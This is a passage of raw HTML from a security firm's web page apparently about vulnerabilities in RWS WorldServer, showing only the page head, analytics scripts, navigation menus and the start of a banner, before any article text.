<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Triskele Labs">
    <meta name="description" content="The WorldServer web software was approached from an unauthenticated perspective and several critical vulnerabilities were discovered. ">
    <meta name="generator" content="HubSpot">
    <title>Cyber Wonderland Vulnerabilities in RWS WorldServer </title>
    <link rel="shortcut icon" href="https://www.triskelelabs.com/hubfs/TL_icon-1.svg">

<meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="The WorldServer web software was approached from an unauthenticated perspective and several critical vulnerabilities were discovered. ">
    <meta property="og:title" content="Cyber Wonderland Vulnerabilities in RWS WorldServer ">
    <meta name="twitter:description" content="The WorldServer web software was approached from an unauthenticated perspective and several critical vulnerabilities were discovered. ">
    <meta name="twitter:title" content="Cyber Wonderland Vulnerabilities in RWS WorldServer ">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52805218911/1656929268728/triskele_labs_theme_2021/assets/vars.min.css">
<link rel="stylesheet" href="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/58246040179/1656583717000/triskele_labs_theme_2021/assets/fonts.min.css">
<link rel="stylesheet" href="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52806010379/1724179810734/triskele_labs_theme_2021/assets/bundle.min.css">
<style>
  @font-face {
    font-family: "Roboto Mono";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Roboto_Mono/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Roboto_Mono/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Open Sans";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Open_Sans/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Open_Sans/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 800;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/800.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/800.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 600;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/600.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/600.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 700;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/700.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/700.woff") format("woff");
  }
</style>

<!-- Editor Styles -->
<style id="hs_editor_style" type="text/css">
.module_1599470825022380-row-0-force-full-width-section > .row-fluid {
  max-width: none !important;
}
.module_1599470825022380-row-2-max-width-section-centering > .row-fluid {
  max-width: 1000px !important;
  margin-left: auto !important;
  margin-right: auto !important;
}
</style>
    

    
<!--  Added by GoogleAnalytics integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create','UA-125432636-1','auto');
  ga('send','pageview');
}}]);
</script>

<!-- /Added by GoogleAnalytics integration -->

<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-TCMKGXF');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->

    <link rel="canonical" href="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver">


<meta property="og:image" content="https://www.triskelelabs.com/hubfs/Hero_Four%20ransomware%20myths_BG2.png">
<meta property="og:image:width" content="1900">
<meta property="og:image:height" content="900">

<meta name="twitter:image" content="https://www.triskelelabs.com/hubfs/Hero_Four%20ransomware%20myths_BG2.png">


<meta property="og:url" content="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver">
<meta name="twitter:card" content="summary_large_image">
<meta http-equiv="content-language" content="en">






    <style>  
pre{
    white-space: pre-wrap;
  }
  
  code {
    display: block;
    font-family: monospace;
    background: #eeeeee;
    font-size:12px;
    padding: 20px;    
    word-break: break-all;
    word-wrap: break-word;
    overflow-wrap: anywhere;
  }
  
  code.inline {
    display: inline;
    padding: 3px 10px;
    color: #eb5757;
    margin: 0px;
    word-break: normal;
    word-wrap: normal;
    overflow-wrap: normal;
  }
</style>
      
</head>
<body class="   hs-content-id-136727297055 hs-site-page page " style="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TCMKGXF" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1605857630400886" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">









<header class="gp-header gp-header_dark gp-header_with-items" style="border-bottom: 1px solid #4f4f4f">
  <div class="gp-header__fade gp-header__fade_bg-two"></div>
  <div class="gp-header__container">
    <div class="gp-header__row">
      <div class="gp-header__col gp-header__col_logo">
        <a href="/?hsLang=en" class="gp-header__logoLink">
          
            <img class="gp-header__logo" src="https://www.triskelelabs.com/hubfs/Logo%20White.svg" alt="Logo White">
          
        </a>
      </div>
      <nav class="gp-header__col gp-header__col_menu">
        <ul class="gp-header__menu">
          
            <li class="gp-header__menuItem">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light" href="https://www.triskelelabs.com/solutions?hsLang=en">Experience</a>
              
            </li>
          
            <li class="gp-header__menuItem gp-header__menuItem_large">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light gp-header__menuLink_dropdown gp-header__menuLink_dropdown_large" href="#">Solutions</a>
              
                <ul class="gp-header__menuDropdown gp-header__menuDropdown_bg-two gp-header__menuDropdown_Lg gp-header__menuDropdown_LgMenu_light">
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/advisory?hsLang=en" class="gp-header__megaDropdownName">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Advisory-1.svg)"></div>
                        Advisory
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/cyber-governance?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Cyber%20Strategy-1.svg)"></div>
                            Cyber Governance
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Security Strategy</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Security Roadmap</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Executive Reporting</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Critical Infrastructure Reviews</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/risk-management?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Risk%20Management.svg)"></div>
                            Risk Management
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/risk-management#1" role="menuitem" target="_self">Internal Risk Assessments</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/risk-management#2" role="menuitem" target="_self">Third Party Risk Assessments</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/compliance-services?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Compliance%20Services-1.svg)"></div>
                            Compliance Services
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">PCI Compliance</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">CPS234 Audits</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">ISO27001 Compliance</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">Policy Frameworks</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/security-as-a-service?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Security-as-a-Service.svg)"></div>
                            Security-as-a-Service
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/security-as-a-service#1" role="menuitem" target="_self">Virtual Chief Information Security Officer (CISO)</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/security-as-a-service#2" role="menuitem" target="_self">Virtual Security Team</a></li>
 </ul>
</div></span>
                        </div>
                        
                      </div>
                    </div>
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/defensive?hsLang=en" class="gp-header__megaDropdownName">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Defensive.svg)"></div>
                        Defensive
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/managed-detection-and-response?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Defence%20Shield%2024x7x365.svg)"></div>
                            Managed Detection and Response (DefenceShield) 
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Monitor</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Assess</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Advanced</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Hunt</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Infiltrate</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/24x7x365-incident-response?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/24x7x365%20Incident%20Response.svg)"></div>
                            24x7x365 Incident Response
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/engineering?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Engineering.svg)"></div>
                            Engineering
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Deployments &amp; Uplift</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Security Configuration Reviews</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Controls Testing</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Incident Response Testing</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/simulated-phishing?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/PhishAway.svg)"></div>
                            Simulated Phishing
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/cyber-threat-intelligence?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Threat%20Intelligence.svg)"></div>
                            Cyber Threat Intelligence
                          </a>
                          
                        </div>
                        
                      </div>
                    </div>
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/offensive?hsLang=en" class="gp-header__megaDropdownName">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Offensive.svg)"></div>
                        Offensive
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/penetration-testing?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Penetration%20Testing.svg)"></div>
                            Penetration Testing
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Web Applications</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Mobile Applications</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Internal Networks</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">External Networks</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Wireless Networks</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Hardware and IoT</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/secure-code-review?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Secure%20Code%20Review.svg)"></div>
                            Secure Code Review
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/red-teaming-attack-simulation?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Red%20Teaming%20&amp;%20Attack%20Simulation.svg)"></div>
                            Red Teaming &amp; Attack Simulation 
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/corie?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/CORIE.svg)"></div>
                            CORIE
                          </a>
                          
                        </div>
                        
                      </div>
                    </div>
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/cyber-security-recruitment?hsLang=en" class="gp-header__megaDropdownName" target="_blank">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/TL%20Recruitment%20Service.png)"></div>
                        Recruitment
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                      </div>
                    </div>
                  
                </ul>
              
            </li>
          
            <li class="gp-header__menuItem">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light gp-header__menuLink_dropdown" href="#">Resources</a>
              
                <ul class="gp-header__menuDropdown gp-header__menuDropdown_bg-two">
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/blog?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Blog</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/cyber-wonderland?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Cyber Wonderland</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/cybeers?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Cybeers Web Series</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/database-consultants-australia-case-study?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light" target="_blank">
                      Customer Stories</a>
                    </li>
                  
                </ul>
              
            </li>
          
            <li class="gp-header__menuItem">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light gp-header__menuLink_dropdown" href="#">About</a>
              
                <ul class="gp-header__menuDropdown gp-header__menuDropdown_bg-two">
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/about?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Meet Triskele Labs</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/team?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Meet the Team</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://apply.workable.com/triskele-labs/#jobs" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light" target="_blank">
                      Careers</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/partners?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Partners</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/certifications?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Certifications</a>
                    </li>
                  
                </ul>
              
            </li>
          
        </ul>
        <div class="gp-header__ctas gp-header__ctas_mobile">
          
            <a class="gp-header__phone" href="tel:13002429237">
              <div class="gp-header__phone-icon"></div>
              <div class="gp-header__phone-number">1300 24 Cyber</div>
            </a>
          
          
            
            
            <a href="https://www.triskelelabs.com/contact?hsLang=en" class="gp-header__cta gp-header__cta_primary">
            Get in touch</a>
          
        </div>
      </nav>
      <div class="gp-header__nav">
        <a href="#" class="gp-header__search-icon"></a>
        <div class="gp-header__search">
          <div class="gp-header__search-fade"></div>
          <div class="gp-header__search-container">
            <div class="gp-header__search-row">
              <div class="gp-header__search-col">
                <form action="/hs-search-results" class="gp-header__search-form">
                  <input type="text" class="gp-header__search-input" name="term" autocomplete="off" aria-label="Search" placeholder="Type your search query">

                  
                  
                  
                  

                  <button class="gp-header__search-button" aria-label="Search"></button>
                </form>
              </div>
            </div>
          </div>
        </div>
        <a href="#" class="gp-header__hamburger"></a>
      </div>
      <div class="gp-header__col gp-header__col_cta">
        
          <a class="gp-header__phone" href="tel:13002429237">
            <div class="gp-header__phone-icon"></div>
            <div class="gp-header__phone-number">1300 24 Cyber</div>
          </a>
        
        <div class="gp-header__ctas">
          
            
            
            <a href="https://www.triskelelabs.com/contact?hsLang=en" class="gp-header__cta gp-header__cta_primary">
              Get in touch
            </a>
          
        </div>
      </div>
    </div>
  </div>
</header>

</div>

<div class="container-fluid">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

</div><!--end widget-span -->
</div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-widget_container " style="" data-widget-type="widget_container" data-x="0" data-w="12">
<div class="container-fluid">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-1 module_1599470825022380-row-0-force-full-width-section dnd-section">
<div class="row-fluid ">
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 dnd-section">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-cell dnd-column" style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-3 dnd-row">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_widget_1695808704225" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">




<div id="" class="gp-block gp-block_paddings- gp-block_dark gp-block_text-light gp-heroRich
             
             " style="
      
      
        background-image: url(https://www.triskelelabs.com/hubfs/Hero_Four%20ransomware%20myths_BG2.png);
        
      ">
  
  
  
  <div class="gp-block__wrapper">
    






<div class="gp-heroRich__wrp gp-heroRich__wrp_large" data-slidetime="600" data-lastslidetime="1800" data-lettertime="63">
    
  <div class="gp-heroRich__container">
    <div class="gp-heroRich__row">
    
          <div class="gp-heroRich__col gp-heroRich__col_textWide">
            
  
  
  
